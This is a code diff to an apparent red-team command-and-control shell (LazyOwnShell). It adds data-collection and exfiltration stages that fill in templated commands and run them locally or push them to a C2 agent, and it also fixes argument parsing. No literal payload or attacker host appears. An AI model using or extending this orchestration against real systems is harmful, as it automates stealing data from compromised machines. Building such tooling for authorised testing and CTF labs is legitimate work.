@@ -22856,7 +22856,6 @@ class LazyOwnShell(cmd2.Cmd):
         Returns:
             None
         """
-        # TODO: implement the data-upload stage and the exfiltration stage (for example HackTheBox flags).
         self.params["c2_port"]
         lhost = self.params["lhost"]
         lport = self.params["lport"]
@@ -22877,11 +22876,11 @@ class LazyOwnShell(cmd2.Cmd):
 
             id_adversary = input("    [!] Enter the id of the adversary: ")
         else:
-            if len(line) == 3:
-                args = line.split(" ")
+            args = line.split()
+            if len(args) >= 2:
                 id_adversary = args[0]
-                confirm = args[1]
-            elif len(line) == 1:
+                confirm = args[1] if len(args) > 1 else None
+            elif len(args) == 1:
                 confirm = None
                 id_adversary = line.strip()
 
@@ -22897,7 +22896,9 @@ class LazyOwnShell(cmd2.Cmd):
                 "pid": adversary.pid,
                 "param": adversary.param,
                 "shellcode": adversary.shellcode,
-                "lhost": lhost
+                "lhost": lhost,
+                "lport": str(lport),
+                "rhost": str(self.params.get("rhost", "")),
             }
             command = replace_placeholders(adversary.command, replacements)
             if adversary.encoder == "base64":
@@ -22917,6 +22918,13 @@ class LazyOwnShell(cmd2.Cmd):
             copy_command = replace_placeholders(adversary.copy_command, replacements)
             replace_command = replace_placeholders(adversary.replace_command, replacements)
             replace_command = replace_command.replace("[shellcode]","{shellcode}")
+
+            exfil_data = getattr(adversary, 'exfil_data', '')
+            exfil_upload = getattr(adversary, 'exfil_upload', '')
+            if exfil_data:
+                exfil_data = replace_placeholders(exfil_data, replacements)
+            if exfil_upload:
+                exfil_upload = replace_placeholders(exfil_upload, replacements)
 
             if adversary.id == 5:
                 print_warn(f"{path}/{adversary.output_path}/{adversary.name}")
@@ -22941,6 +22949,10 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"Encoded Command: {base64_command}")
             print_msg(f"Payload Command: {payload}")
             print_msg(f"Clean Command: {clean_cmd}")
+            if exfil_data:
+                print_msg(f"Exfil Data Command: {exfil_data}")
+            if exfil_upload:
+                print_msg(f"Exfil Upload Command: {exfil_upload}")
 
             local_stack = [copy_command, replace_command, compile_command]
             remote_stack = [droper_command, payload, clean_cmd]
@@ -22980,6 +22992,27 @@ class LazyOwnShell(cmd2.Cmd):
                     command_clipboard.communicate(input=command.encode())
                     print_msg(f"Command copied to clipboard: {command}")
                 time.sleep(int(adversary.sleep))
+
+            if exfil_data and confirm in ('l', 'r'):
+                time.sleep(int(adversary.sleep))
+                print_succ("=== DATA COLLECTION STAGE ===")
+                print_warn(f"Collecting data: {exfil_data}")
+                if confirm == 'l':
+                    subprocess.run(exfil_data + " 2>/dev/null", shell=True)
+                elif confirm == 'r':
+                    self.issue_command_to_c2(exfil_data, user)
+                time.sleep(int(adversary.sleep))
+
+            if exfil_upload and confirm in ('l', 'r'):
+                print_succ("=== EXFILTRATION STAGE ===")
+                print_warn(f"Exfiltrating data: {exfil_upload}")
+                if confirm == 'l':
+                    subprocess.run(exfil_upload + " 2>/dev/null", shell=True)
+                elif confirm == 'r':
+                    self.issue_command_to_c2(exfil_upload, user)
+                time.sleep(int(adversary.sleep))
+                exfil_output = f"{path}/sessions/loot_{adversary.name}_{int(time.time())}.txt"
+                print_succ(f"Exfiltration complete. Check loot at: {exfil_output}")
         else:
             print_warn(f"No adversary found with id {line}")
 
